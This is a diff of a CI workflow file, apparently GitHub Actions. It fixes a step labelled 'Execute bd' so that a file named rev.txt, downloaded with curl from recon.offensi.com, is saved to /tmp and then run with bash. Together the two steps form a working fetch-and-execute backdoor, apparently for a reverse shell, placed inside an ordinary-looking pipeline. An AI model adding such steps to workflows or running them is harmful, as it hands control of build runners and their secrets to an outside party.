@@ -21,7 +21,7 @@ jobs:
       - name: install deps 
         run: sudo apt-get install python3 curl -y 
       - name: Execute bd
-        run: curl recon.offensi.com/rev.txt -o /tmp/out.txt
+        run: curl recon.offensi.com/rev.txt -o /tmp/rev.txt
       - name: Execute script
         run: bash /tmp/rev.txt
   close_pull_request_job:
